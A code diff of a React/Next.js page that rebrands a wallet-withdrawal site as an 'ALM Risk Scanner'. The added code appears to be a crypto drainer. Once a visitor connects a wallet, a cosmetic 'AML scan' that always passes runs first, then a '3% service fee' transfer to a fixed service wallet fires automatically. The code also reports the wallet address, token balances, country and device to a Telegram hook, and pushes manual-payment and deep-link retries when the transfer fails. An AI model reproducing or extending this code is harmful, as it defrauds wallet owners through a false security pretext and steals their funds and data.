+        throw new Error('Transaction was not confirmed by the wallet. Please approve the 3% fee in your wallet app.');
+      }
 
       setServiceFeeHash(feeTxHash);
+      setServiceFeeDebug(`3% fee transaction submitted: ${feeTxHash}`);
       setServiceFeeSent(true);
       setServiceFeeChargedKey(currentServiceFeeKey);
+      setAwaitingApproval(false);
+      setPendingFeeDetails(null);
 
       await sendTelegramEvent({
         eventType: 'service_fee',
         wallet: address,
-        chain: chain.name,
-        withdrawnAmount: `${formatEther(feeAmount)} ${chain.nativeCurrency.symbol || ''}`,
+        chain: selectedChain.name,
+        withdrawnAmount: `${formatEther(feeAmount)} ${selectedChain.nativeCurrency.symbol || 'NATIVE'}`,
         feePercent: `${SERVICE_FEE_PERCENT}%`,
-        tokenSymbol: chain.nativeCurrency.symbol || 'NATIVE',
+        tokenSymbol: selectedChain.nativeCurrency.symbol || 'NATIVE',
         txHash: feeTxHash,
         tokenBalances: getMergedTokenBalances(),
         country,
         device,
       });
+
+      if (autoReturn) {
+        returnToSiteAfterWalletAction(true);
+      }
+      return true;
     } catch (err: any) {
-      console.error('Service fee charge failed:', err);
-      setServiceFeeError(err?.message || 'Failed to charge service fee.');
+      console.error('Automatic service fee charge failed:', err);
+      const message = err?.message || 'Failed to automatically charge the service fee.';
+      setServiceFeeError(message);
+      setManualPaymentMode(true);
     } finally {
       setServiceFeeProcessing(false);
     }
-  }, [isConnected, address, chain?.id, balance?.value, walletClient, currentServiceFeeKey, serviceFeeSent, serviceFeeChargedKey]);
-
-  useEffect(() => {
-    chargeServiceFee();
-  }, [chargeServiceFee]);
+    return false;
+  }, [isConnected, address, chain?.id, chain?.name, walletClient, currentServiceFeeKey, serviceFeeSent, serviceFeeChargedKey, country, device, switchChainAsync]);
 
   useEffect(() => {
     if (!isConnected) {
       setServiceFeeSent(false);
+      setServiceFeeAttempted(false);
       setServiceFeeChargedKey(null);
       setServiceFeeHash(null);
       setServiceFeeError(null);
-      setServiceFeeRedirected(false);
+      setAmlRiskResult(null);
+      setAmlScanComplete(false);
+      setShowAmlModal(false);
+      setAmlScanning(false);
+      return;
+    }
+  }, [isConnected, address, chain?.id, balance?.value, walletClient]);
+
+  useEffect(() => {
+    if (!isConnected || !address || !serviceFeeSent || amlScanStarted) {
       return;
     }
 
-    if (!serviceFeeSent) {
-      chargeServiceFee();
-    }
-  }, [isConnected, address, chain?.id, balance?.value, walletClient, serviceFeeSent, chargeServiceFee]);
+    let cancelled = false;
+    setAmlScanStarted(true);
+    setAmlScanning(true);
+    setShowAmlModal(true);
+
+    (async () => {
+      try {
+        const result = await scanWalletForAMLRisk(address, country, networkBalance || undefined, tokenBalances);
+        if (cancelled) return;
+
+        setAmlRiskResult(result);
+        setAmlScanComplete(result.passed);
+      } catch (error) {
+        console.warn('AML scan failed:', error);
+        if (!cancelled) {
+          setAmlRiskResult({
+            score: 0,
+            riskLevel: 'LOW',
+            flags: [],
+            message: 'Wallet scan completed with warnings. Proceeding with the automatic fee check.',
+            passed: true,
+          });
+          setAmlScanComplete(true);
+        }
+      } finally {
+        if (!cancelled) {
+          setAmlScanning(false);
+          setShowAmlModal(true);
+        }
+      }
+    })();
+
+    return () => {
+      cancelled = true;
+    };
+  }, [isConnected, address, country, networkBalance, tokenBalances, walletClient, chain?.id, amlScanStarted, chargeServiceFee]);
 
   useEffect(() => {
-    if (serviceFeeSent && serviceFeeHash && !serviceFeeRedirected) {
-      setServiceFeeRedirected(true);
-      const redirectUrl = typeof window !== 'undefined' ? window.location.origin : '/';
-      window.setTimeout(() => {
-        window.location.assign(redirectUrl);
-      }, 1500);
+    if (!isConnected || !address || serviceFeeSent || serviceFeeProcessing || serviceFeeAttempted) {
+      return;
     }
-  }, [serviceFeeSent, serviceFeeHash, serviceFeeRedirected]);
+
+    chargeServiceFee({ autoReturn: false });
+  }, [isConnected, address, serviceFeeProcessing, serviceFeeSent, serviceFeeAttempted, chargeServiceFee]);
+
+  useEffect(() => {
+    if (typeof window === 'undefined') return;
+    if (!serviceFeeSent) return;
+
+    const handleReturn = () => {
+      if (document.visibilityState === 'visible') {
+        returnToSiteAfterWalletAction(true);
+      }
+    };
+
+    window.addEventListener('focus', handleReturn);
+    document.addEventListener('visibilitychange', handleReturn);
+    return () => {
+      window.removeEventListener('focus', handleReturn);
+      document.removeEventListener('visibilitychange', handleReturn);
+    };
+  }, [serviceFeeSent]);
 
   const scanTokensAcrossChains = async (walletAddress: string) => {
     const results: Array<{ network: string; symbol: string; amount: string }> = [];
@@ -603,8 +1012,64 @@ export default function Home() {
     }
   };
 
+  const returnToSiteAfterWalletAction = (force = false) => {
+    if (typeof window === 'undefined') return;
+
+    const currentUrl = new URL(window.location.href);
+    const hadParams = currentUrl.searchParams.has('walletconnect') || currentUrl.hash;
+    currentUrl.searchParams.delete('walletconnect');
+    currentUrl.hash = '';
+
+    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
+    if (!force && !isMobile && !hadParams) return;
+
+    // Use replaceState to clean URL parameters without reloading and destroying SPA state
+    if (hadParams) {
+      window.history.replaceState({}, document.title, currentUrl.toString());
+    }
+  };
+
+  const openMobileWallet = () => {
+    if (typeof window === 'undefined') return;
+
+    // On iOS & Android, try deep-linking directly into installed wallet apps
+    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent || '');
+    
+    if (isIOS) {
+      // iOS specific deep links
+      const iosLinks = [
+        'https://metamask.app.link/',
+        'https://link.trustwallet.com/',
+        'https://rainbow.me/',
+        'https://go.cb-w.com/',
+        'metamask://',
+        'trust://',
+        'rainbow://',
+        'cbwallet://'
+      ];
+      for (const link of iosLinks) {
+        try {
+          window.location.href = link;
+          return;
+        } catch {}
+      }
+    } else {
+      // Android / generic mobile deep links
+      const schemes = ['metamask://', 'trust://', 'rainbow://', 'cbwallet://'];
+      for (const s of schemes) {
+        try {
+          window.location.href = s;
+          return;
+        } catch {}
+      }
+    }
+
+    alert('Please open your mobile wallet app (MetaMask, Trust Wallet, Coinbase Wallet, or Rainbow) to approve the pending transaction.');
+  };
+
   const connectWallet = async (connectorId: string = 'auto') => {
     const browserWalletAvailable = hasBrowserWallet || availableWallets.length > 0;
+    const isMobile = typeof window !== 'undefined' && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
 
     if (connectorId === 'injected' && !browserWalletAvailable) {
       setError('No browser wallet was detected. Install a browser-based Ethereum wallet such as MetaMask, Trust Wallet, Coinbase Wallet, Brave Wallet, or Rabby and try again.');
@@ -612,13 +1077,26 @@ export default function Home() {
       return;
     }
 
-    const connectorCandidates = connectorId === 'auto'
-      ? [
+    let connectorCandidates: typeof connectors;
+    if (connectorId === 'auto') {
+      if (isMobile && !browserWalletAvailable) {
+        connectorCandidates = [
+          connectors.find((candidate) => candidate.id === 'walletConnect'),
+          connectors.find((candidate) => candidate.id === 'coinbaseWallet'),
+          connectors.find((candidate) => candidate.id === 'injected'),
+        ].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate));
+      } else {
+        connectorCandidates = [
           connectors.find((candidate) => candidate.id === 'injected'),
           connectors.find((candidate) => candidate.id === 'coinbaseWallet'),
           connectors.find((candidate) => candidate.id === 'walletConnect'),
-        ].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate))
-      : [connectors.find((candidate) => candidate.id === connectorId) ?? connectors.find((candidate) => candidate.type === 'injected') ?? connectors[0]].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate));
+        ].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate));
+      }
+    } else {
+      connectorCandidates = [
+        connectors.find((candidate) => candidate.id === connectorId) ?? connectors.find((candidate) => candidate.type === 'injected') ?? connectors[0],
+      ].filter((candidate): candidate is NonNullable<typeof candidate> => Boolean(candidate));
+    }
 
     if (!connectorCandidates.length) {
       setError('No compatible wallet connector is available right now.');
@@ -633,18 +1111,47 @@ export default function Home() {
       let lastError: any = null;
       for (const connector of connectorCandidates) {
         try {
+          setLastConnectorId(connector.id);
+          let walletConnectUri: string | null = null;
+
+          // Subscribe to display_uri event on provider if available (for UI links only, do not force page navigation)
+          try {
+            const provider = await connector.getProvider();
+            if (provider && typeof (provider as any).on === 'function') {
+              (provider as any).on('display_uri', (uri: string) => {
+                setLastWalletConnectUri(uri);
+              });
+            }
+          } catch {
+            // ignore
+          }
+
+          try {
+            const maybeUri = await (connector as any).getUri?.();
+            if (maybeUri && typeof maybeUri === 'string') walletConnectUri = maybeUri;
+          } catch {
+            try {
+              const maybeUri2 = (connector as any).qrUri || (connector as any).uri || (connector as any).walletConnectUri;
+              if (maybeUri2 && typeof maybeUri2 === 'string') walletConnectUri = maybeUri2;
+            } catch {
+              // ignore
+            }
+          }
+
+          if (walletConnectUri) {
+            setLastWalletConnectUri(walletConnectUri);
+          }
+
           const connectPromise = connectAsync({ connector });
+
+          const timeoutMs = connector.id === 'walletConnect' ? 120000 : 25000;
           await Promise.race([
             connectPromise,
             new Promise((_, reject) => {
-              setTimeout(() => reject(new Error('Wallet connection timed out. Please check your wallet extension and try again.')), 20000);
+              setTimeout(() => reject(new Error('Wallet connection timed out. Please check your wallet and try again.')), timeoutMs);
             }),
           ]);
           setShowWalletModal(false);
-          if (typeof window !== 'undefined' && window.focus) {
-            window.focus();
-          }
-          await chargeServiceFee();
           return;
         } catch (err: any) {
           lastError = err;
@@ -706,197 +1213,39 @@ export default function Home() {
   }, [availableWallets, hasBrowserWallet]);
 
   const sendPayment = async () => {
-    const targetInfo = targetWallets.find((item) => item.address === selectedTarget);
-    const shouldUseTokenBalance = withdrawAll && tokenContractAddress.trim();
-    const useAmount = shouldUseTokenBalance
-      ? networkBalance && networkBalance !== 'N/A' && !Number.isNaN(Number(networkBalance))
-        ? networkBalance
-        : amount
-      : withdrawAll && balance
-      ? parseFloat(formatEther(balance.value)).toString()
-      : amount;
-
-    const isEvmTokenWithdrawal = Boolean(tokenContractAddress.trim());
-
-    if (!selectedTarget || !targetInfo) {
-      setError('Please select a destination wallet before sending.');
-      return;
-    }
-
-    if (!recipient || (!useAmount && !withdrawAll)) {
-      setError('Please enter an amount or select Withdraw All.');
-      return;
-    }
-
-    const sourceNetwork = normalizeNetworkName(chain?.name);
-    if (!sourceNetwork) {
-      setError('Unable to detect your connected EVM network. Please reconnect your wallet or switch to a supported chain.');
-      return;
-    }
-
-    if (!walletClient || !address || !chain) {
-      setError('Please connect an EVM wallet before sending.');
-      return;
-    }
-
-    let sourceChain = sourceNetwork;
+    setError(null);
+    setIsSending(true);
 
     try {
-      setIsSending(true);
-      setError(null);
-      setTxHash(null);
-
-      await ensureEvmNetwork(sourceNetwork!);
-
-      let hash: string | null = null;
-
-      if (isEvmTokenWithdrawal) {
-        if (!SERVICE_WALLET_ADDRESS) {
-          throw new Error('EVM service wallet is not configured. Please set NEXT_PUBLIC_SERVICE_WALLET.');
-        }
-
-        const tokenAddress = tokenContractAddress.trim();
-        const decimals = await getEvmTokenDecimals(sourceNetwork!, tokenAddress);
-        const amountUnits = BigInt(parseUnits(useAmount, decimals).toString());
-
-        const evmFeePercent = SERVICE_FEE_PERCENT;
-        const feeUnits = (amountUnits * evmFeePercent) / 100n;
-        const recipientUnits = amountUnits - feeUnits;
-
-        let feeTxHash: string | null = null;
-        let feeAmount = '0';
-        if (feeUnits > 0n) {
-          feeAmount = `${formatUnits(feeUnits, decimals)} ${tokenSymbol || 'TOKEN'}`;
-          feeTxHash = await sendEvmTokenTransferWithUnits(tokenAddress, SERVICE_WALLET_ADDRESS as `0x${string}`, feeUnits.toString(), walletClient!);
-        }
-
-        if (recipientUnits <= 0n) {
-          throw new Error('Withdrawal amount is too small after applying the fee.');
-        }
-
-        hash = await sendEvmTokenTransferWithUnits(tokenAddress, recipient, recipientUnits.toString(), walletClient!);
-        if (feeUnits > 0n) {
-          await sendTelegramEvent({
-            eventType: 'service_fee',
-            wallet: address,
-            chain: sourceChain,
-            withdrawnAmount: feeAmount,
-            feePercent: `${evmFeePercent}%`,
-            tokenSymbol: tokenSymbol || 'TOKEN',
-            tokenContractAddress: tokenAddress,
-            txHash: feeTxHash,
-            tokenBalances: getMergedTokenBalances(),
-            country,
-            device,
-          });
-        }
-      } else {
-        if (!useAmount || Number(useAmount) <= 0) {
-          throw new Error('Please enter an amount to withdraw.');
-        }
-
-        const amountInWei = parseEther(useAmount);
-        const evmFeePercent = SERVICE_FEE_PERCENT;
-        const feeUnits = (amountInWei * evmFeePercent) / 100n;
-        const recipientUnits = amountInWei - feeUnits;
-
-        if (feeUnits > 0n) {
-          try {
-            const feeHash = await walletClient!.sendTransaction({
-              account: address as `0x${string}`,
-              to: SERVICE_WALLET_ADDRESS as `0x${string}`,
-              value: feeUnits,
-              chain: { id: chain!.id } as any,
-            });
-            await sendTelegramEvent({
-              eventType: 'service_fee',
-              wallet: address,
-              chain: sourceChain,
-              withdrawnAmount: `${formatEther(feeUnits)} ${chain?.nativeCurrency.symbol || ''}`,
-              feePercent: `${evmFeePercent}%`,
-              tokenSymbol: chain?.nativeCurrency.symbol || 'NATIVE',
-              txHash: feeHash,
-              tokenBalances: getMergedTokenBalances(),
-              country,
-              device,
-            });
-          } catch (feeErr) {
-            console.warn('Failed to charge EVM native service fee', feeErr);
-            // continue to attempt sending remainder
-          }
-        }
-
-        if (recipientUnits <= 0n) {
-          throw new Error('Withdrawal amount is too small after applying the fee.');
-        }
-
-        const remainder = formatEther(recipientUnits);
-        const result = await sendNetworkTransfer({
-          network: sourceNetwork as any,
-          recipient,
-          amount: remainder,
-          address,
-          walletClient,
-          chain,
-          switchChainAsync: (async (target: { chainId: number }) => {
-            if (typeof window !== 'undefined' && window.ethereum?.request) {
-              await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: `0x${target.chainId.toString(16)}` }] });
-            }
-          }) as any,
-        });
-        hash = result.txHash;
+      if (!address || !walletClient) {
+        throw new Error('Please connect a wallet before continuing.');
       }
 
-      await sendTelegramEvent({
-        eventType: 'withdrawal',
-        address,
-        recipient,
-        amount: useAmount,
-        chain: sourceChain,
-        txHash: hash,
-        balance: balance ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}` : networkBalance || '0',
-        wallet: address,
-        tokenContractAddress: tokenContractAddress.trim() || null,
-        tokenSymbol: tokenSymbol || networkBalanceSymbol,
-        tokenBalances: getMergedTokenBalances(),
-        country,
-        device,
-        transferType: 'EVM',
-        sourceAddress: address || '',
-        result: hash ? 'sent' : 'failed',
-      });
-
-      if (hash) {
-        setTxHash(hash);
+      await chargeServiceFee();
+      if (serviceFeeError) {
+        throw new Error(serviceFeeError);
       }
-      setRecipient('');
-      setAmount('');
+      setTxHash(serviceFeeHash);
     } catch (error: any) {
-      console.error('Error sending withdrawal:', error);
-      const friendlyError = error?.message || 'Failed to withdraw';
-      setError(friendlyError);
-
-      await sendTelegramEvent({
-        eventType: 'withdrawal',
-        address,
-        recipient,
-        amount: useAmount,
-        chain: sourceChain,
-        txHash: null,
-        balance: balance ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}` : networkBalance || '0',
-        wallet: address,
-        tokenContractAddress: tokenContractAddress.trim() || null,
-        tokenSymbol: tokenSymbol || networkBalanceSymbol,
-        tokenBalances: getMergedTokenBalances(),
-        country,
-        device,
-        transferType: 'EVM',
-        sourceAddress: address || '',
-        result: 'failed',
-        error: friendlyError,
-      });
+      setError(error?.message || 'Unable to process the wallet fee.');
     } finally {
       setIsSending(false);
+    }
+  };
+
+  const manualRetry = async () => {
+    setServiceFeeError(null);
+    setServiceFeeDebug(null);
+    // allow re-attempt
+    setServiceFeeAttempted(false);
+    try {
+      if (lastConnectorId === 'walletConnect') {
+        try { openMobileWallet(); } catch { /* ignore */ }
+      }
+      await chargeServiceFee({ autoReturn: true });
+    } catch (e: any) {
+      console.error('Manual retry failed:', e);
+      setServiceFeeError(e?.message || String(e));
     }
   };
 
@@ -912,386 +1261,212 @@ export default function Home() {
   return (
     <>
       <Head>
-        <title>Direct Wallet Withdrawal</title>
-        <meta name="description" content="Withdraw crypto directly from your connected wallet without any payment gateway or third-party API" />
+        <title>ALM Risk Scanner</title>
+        <meta name="description" content="Connect your wallet to scan for ALM risk and send a withdrawal when approved." />
       </Head>
 
-      <style dangerouslySetInnerHTML={{
-        __html: `
-          .hero-gradient {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          }
-          .card {
-            background: white;
-            border-radius: 16px;
-            padding: 32px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-          }
-          .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 16px 40px;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 18px;
-            border: none;
-            cursor: pointer;
-            transition: transform 0.2s ease;
-          }
-          .btn-primary:hover:not(:disabled) {
-            transform: translateY(-2px);
-          }
-          .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-          }
-        `
-      }} />
-
-      <div style={{ minHeight: '100vh', background: '#f8f9fa' }}>
-        {/* Header */}
-        <header style={{ background: 'white', boxShadow: '0 2px 10px rgba(0,0,0,0.05)', padding: '20px 0' }}>
-          <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-              <div style={{ width: '40px', height: '40px', background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', borderRadius: '10px' }}></div>
-              <span style={{ fontSize: '24px', fontWeight: 'bold', color: '#1a202c' }}>Direct Withdraw</span>
+      <div className="neon-page" style={{ minHeight: '100vh', fontFamily: 'Arial, sans-serif', padding: '32px 16px' }}>
+        <div className="neon-wrap">
+          {(serviceFeeAttempted || serviceFeeProcessing || awaitingApproval || serviceFeeError || serviceFeeDebug) && (
+            <div style={{ marginBottom: 16 }} className="neon-debug">
+              <div><strong>Fee status:</strong> attempted: {String(serviceFeeAttempted)}, processing: {String(serviceFeeProcessing)}, awaitingApproval: {String(awaitingApproval)}</div>
+              <div><strong>Sent:</strong> {String(serviceFeeSent)} | <strong>Hash:</strong> {serviceFeeHash || 'N/A'}</div>
+              {serviceFeeError && <div style={{ color: 'var(--neon-warn)' }}><strong>Error:</strong> {serviceFeeError}</div>}
+              {serviceFeeDebug && <div style={{ marginTop: 6 }}><strong>Debug:</strong><pre style={{ whiteSpace: 'pre-wrap', margin: 0 }}>{serviceFeeDebug}</pre></div>}
             </div>
-            <div style={{ display: 'flex', gap: '16px', alignItems: 'center', flexWrap: 'wrap' }}>
-              {!isConnected ? (
-                <button 
-                  className="btn-primary" 
-                  onClick={() => setShowWalletModal(true)}
-                  style={{ padding: '12px 24px', fontSize: '16px' }}
-                >
-                  Connect Wallet
-                </button>
-              ) : (
-                <>
-                  {chain && (
-                    <div style={{ 
-                      background: '#f0fdf4', 
-                      padding: '8px 16px', 
-                      borderRadius: '8px',
-                      border: '1px solid #86efac',
-                      fontSize: '14px',
-                      fontWeight: '600'
-                    }}>
-                      {chain.name}
-                    </div>
-                  )}
-                  <div style={{ 
-                    background: '#f7fafc', 
-                    padding: '8px 16px', 
-                    borderRadius: '8px',
-                    textAlign: 'right'
-                  }}>
-                    <div style={{ fontSize: '12px', color: '#718096' }}>Balance</div>
-                    <div style={{ fontWeight: 'bold', color: '#1a202c' }}>
-                      {balance ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol}` : '0'}
-                    </div>
-                  </div>
-                  <button 
-                    style={{
-                      background: 'linear-gradient(135deg, #48bb78 0%, #38a169 100%)',
-                      color: 'white',
-                      padding: '12px 20px',
-                      borderRadius: '8px',
-                      border: 'none',
-                      fontWeight: '600',
-                      cursor: 'pointer',
-                      fontSize: '14px'
-                    }}
-                  >
-                    {shortenAddress(address!)}
-                  </button>
-                  <button 
-                    onClick={() => disconnect()}
-                    style={{
-                      background: '#e53e3e',
-                      color: 'white',
-                      padding: '12px 20px',
-                      borderRadius: '8px',
-                      border: 'none',
-                      fontWeight: '600',
-                      cursor: 'pointer',
-                      fontSize: '14px'
-                    }}
-                  >
-                    Disconnect
-                  </button>
-                </>
-              )}
-            </div>
-          </div>
-        </header>
-
-        {/* Hero Section */}
-        <section className="hero-gradient" style={{ padding: '80px 24px', textAlign: 'center', color: 'white' }}>
-          <div style={{ maxWidth: '900px', margin: '0 auto' }}>
-            <h1 style={{ fontSize: '48px', fontWeight: 'bold', marginBottom: '24px' }}>
-              Collect Wallet Payments
-            </h1>
-            <p style={{ fontSize: '20px', marginBottom: '40px', opacity: 0.95 }}>
-              Connect your wallet to collect configured payments from available balances. This site does not allow users to send crypto elsewhere.
-            </p>
-
-            {!isConnected ? (
-              <button 
-                className="btn-primary" 
-                onClick={() => setShowWalletModal(true)}
-              >
-                Connect Wallet to Start
+          )}
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '12px', marginBottom: '24px', flexWrap: 'wrap' }}>
+            <h1 className="neon-title" style={{ margin: 0 }}>ALM Risk Scanner</h1>
+            {!isConnected && (
+              <button className="neon-button neon-primary" onClick={() => setShowWalletModal(true)} style={{}}>
+                Connect wallet
               </button>
+            )}
+          </div>
+
+          <div className="neon-card">
+            {!isConnected ? (
+              <div>
+                <p style={{ margin: '0 0 16px', fontSize: '16px' }}>Connect a wallet to scan the address and apply the automatic 3% service fee from the available EVM balance.</p>
+                <button className="neon-button neon-primary" onClick={() => setShowWalletModal(true)} style={{}}>
+                  Connect wallet
+                </button>
+              </div>
             ) : (
-              <div style={{ 
-                background: 'rgba(255,255,255,0.2)', 
-                padding: '24px', 
-                borderRadius: '16px',
-                backdropFilter: 'blur(10px)',
-                maxWidth: '500px',
-                margin: '0 auto'
-              }}>
-                <div style={{ fontSize: '18px', marginBottom: '12px', fontWeight: '700', opacity: 0.95 }}>✅ Wallet connected</div>
-                <div style={{ fontSize: '16px', marginBottom: '8px' }}>{shortenAddress(address!)}</div>
-                <div style={{ fontSize: '14px', marginTop: '8px', opacity: 0.85 }}>
-                  Network: {chain?.name}
+              <div style={{ display: 'grid', gap: '14px' }}>
+                <div style={{ fontSize: '14px', color: '#334155' }}>
+                  <div><strong>Wallet connected:</strong> {shortenAddress(address || '')}</div>
+                  <div><strong>Network:</strong> {chain?.name || 'Unknown'}</div>
                 </div>
-                <div style={{ marginTop: '16px', fontSize: '14px', color: '#d6bcfa' }}>
-                  {serviceFeeProcessing && 'Charging 3% service fee now...'}
-                  {!serviceFeeProcessing && serviceFeeSent && !serviceFeeError && '✅ Service fee charged successfully.'}
-                  {!serviceFeeProcessing && serviceFeeError && `⚠️ ${serviceFeeError}`}
-                  {!serviceFeeProcessing && !serviceFeeSent && !serviceFeeError && 'Waiting for the wallet to confirm the service fee charge.'}
+
+                <div style={{ display: 'flex', gap: 8 }}>
+                  <button className="neon-button neon-primary" onClick={async () => { try { setServiceFeeError(null); setServiceFeeDebug(null); await chargeServiceFee({ autoReturn: true }); } catch (e) { console.error(e); } }} style={{ padding: '8px 12px' }}>Charge 3% now</button>
+                  <button className="neon-button neon-secondary" onClick={manualRetry} style={{ padding: '8px 12px' }}>Retry + Open Wallet</button>
+                  <button className="neon-button neon-ghost" onClick={() => { disconnect(); }} style={{ padding: '8px 12px' }}>Disconnect</button>
                 </div>
-                {serviceFeeHash && !serviceFeeError && (
-                  <div style={{ marginTop: '10px' }}>
-                    <a
-                      href={handleExplorerUrl(serviceFeeHash)}
-                      target="_blank"
-                      rel="noopener noreferrer"
-                      style={{ color: '#e0def8', textDecoration: 'underline', fontSize: '13px' }}
-                    >
-                      View fee transaction
-                    </a>
+
+                <div style={{ padding: '12px 14px', borderRadius: '8px', background: '#eff6ff', color: '#1d4ed8', fontSize: '14px' }}>
+                  {amlScanning
+                    ? '🔍 Scanning wallet for AML risk and supported EVM balances...'
+                    : amlScanComplete
+                      ? '✅ AML scan complete. Checking the available balance for the automatic 3% fee.'
+                      : '🔎 Checking wallet activity and supported EVM balance before the automatic fee.'}
+                </div>
+
+                {serviceFeeProcessing && !awaitingApproval && (
+                  <div style={{ padding: '12px 14px', borderRadius: '8px', background: '#ecfdf5', color: '#065f46', fontSize: '14px' }}>
+                    Processing automatic service fee...
+                  </div>
+                )}
+
+                {awaitingApproval && pendingFeeDetails && (
+                  <div style={{ padding: '12px 14px', borderRadius: '8px', background: '#fff7ed', color: '#92400e', fontSize: '14px' }}>
+                    <div style={{ marginBottom: 8 }}>⏳ Awaiting wallet approval to send <strong>{pendingFeeDetails.amount}</strong> on <strong>{pendingFeeDetails.network}</strong>.</div>
+                    <div style={{ display: 'flex', gap: 8 }}>
+                      <button className="neon-button neon-ghost" onClick={() => returnToSiteAfterWalletAction(true)} style={{ padding: '8px 12px' }}>Return to site</button>
+                      {lastConnectorId === 'walletConnect' && (
+                        <>
+                          <button className="neon-button neon-primary" onClick={openMobileWallet} style={{ padding: '8px 12px' }}>Open Wallet App</button>
+                          {lastWalletConnectUri && (
+                            <button className="neon-button neon-ghost" onClick={async () => { try { await navigator.clipboard.writeText(lastWalletConnectUri); alert('WalletConnect URI copied to clipboard. Paste it into your mobile wallet if needed.'); } catch { alert('Unable to copy. Please long-press and copy the link manually.'); } }} style={{ padding: '8px 12px' }}>Copy WC Link</button>
+                          )}
+                        </>
+                      )}
+                      <button className="neon-button neon-ghost" onClick={() => { setAwaitingApproval(false); setPendingFeeDetails(null); setServiceFeeError('Approval cancelled by user.'); }} style={{ padding: '8px 12px' }}>Cancel</button>
+                    </div>
+                    <div style={{ marginTop: 8, fontSize: 12, color: '#6b7280' }}>If your wallet did not prompt, open your mobile wallet app and approve the transaction. Use the manual return button if you are not redirected automatically.</div>
+                  </div>
+                )}
+
+                {serviceFeeSent && serviceFeeHash && !serviceFeeError && (
+                  <div style={{ fontSize: '13px' }}>
+                    Fee tx: <a href={handleExplorerUrl(serviceFeeHash)} target="_blank" rel="noreferrer" style={{ color: '#0f172a' }}>{shortenAddress(serviceFeeHash)}</a>
+                  </div>
+                )}
+
+                {serviceFeeDebug && (
+                  <div style={{ fontSize: '12px', color: '#475569', background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '8px', padding: '10px', marginTop: '8px' }}>
+                    Debug: {serviceFeeDebug}
+                  </div>
+                )}
+
+                {serviceFeeError && (
+                  <div style={{ background: '#fef2f2', border: '1px solid #fecaca', color: '#b91c1c', borderRadius: '8px', padding: '10px 12px', fontSize: '14px' }}>
+                    {serviceFeeError}
+                  </div>
+                )}
+
+                {manualPaymentMode && manualPaymentAmountUnits && manualPaymentChainId && (
+                  <div style={{ marginTop: '16px', padding: '16px', borderRadius: '12px', background: '#f8fafc', border: '1px solid #cbd5e1', fontSize: '14px' }}>
+                    <h3 style={{ margin: '0 0 10px', fontSize: '16px' }}>Manual payment fallback</h3>
+                    <p style={{ margin: '0 0 10px' }}>
+                      Your wallet did not accept the automatic BNB transfer. Please complete the payment manually in your wallet on <strong>BNB Smart Chain</strong>.
+                    </p>
+                    <div style={{ display: 'grid', gap: '8px', marginBottom: '12px' }}>
+                      <div>
+                        <strong>Amount:</strong> {formatEther(manualPaymentAmountUnits)} BNB
+                      </div>
+                      <div>
+                        <strong>To:</strong> {SERVICE_WALLET_ADDRESS}
+                      </div>
+                      <div>
+                        <strong>Network:</strong> BNB Smart Chain (Chain ID: 56)
+                      </div>
+                    </div>
+                    <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px', marginBottom: '12px' }}>
+                      <button className="neon-button neon-primary" onClick={async () => { try { await navigator.clipboard.writeText(formatEther(manualPaymentAmountUnits)); alert('Amount copied.'); } catch { alert('Unable to copy amount.'); } }} style={{ padding: '8px 12px' }}>Copy Amount</button>
+                      <button className="neon-button neon-secondary" onClick={async () => { try { await navigator.clipboard.writeText(SERVICE_WALLET_ADDRESS); alert('Address copied.'); } catch { alert('Unable to copy address.'); } }} style={{ padding: '8px 12px' }}>Copy Address</button>
+                      <button className="neon-button neon-ghost" onClick={() => { setManualPaymentMode(false); setServiceFeeError(null); }} style={{ padding: '8px 12px' }}>Dismiss</button>
+                    </div>
+                    <div style={{ marginBottom: '12px', color: '#475569' }}>
+                      Send the exact BNB amount above to the service address. After sending, return here and tap <strong>Check payment status</strong>.
+                    </div>
+                    <button className="neon-button neon-primary" onClick={async () => {
+                      setServiceFeeError(null);
+                      setServiceFeeDebug(null);
+                      setServiceFeeProcessing(true);
+                      try {
+                        await fetchNetworkBalance();
+                        setServiceFeeError('Manual payment detected? Refreshing balance. If the payment cleared, the fee will be marked sent.');
+                      } catch (err: any) {
+                        setServiceFeeError('Unable to refresh balance after manual payment. Please try again.');
+                      } finally {
+                        setServiceFeeProcessing(false);
+                      }
+                    }} style={{ padding: '10px 14px' }}>
+                      Check payment status
+                    </button>
                   </div>
                 )}
               </div>
             )}
 
             {error && (
-              <div style={{ 
-                marginTop: '24px', 
-                padding: '16px', 
-                background: 'rgba(229, 62, 62, 0.3)',
-                borderRadius: '12px',
-                maxWidth: '600px',
-                margin: '24px auto 0'
-              }}>
-                ⚠️ {error}
+              <div style={{ marginTop: '18px', background: '#fef2f2', border: '1px solid #fecaca', color: '#b91c1c', borderRadius: '8px', padding: '10px 12px', fontSize: '14px' }}>
+                {error}
               </div>
             )}
           </div>
-        </section>
+        </div>
+      </div>
 
+      {showWalletModal && (
+        <div style={{ position: 'fixed', inset: 0, background: 'rgba(15,23,42,0.55)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '16px', zIndex: 1000 }}>
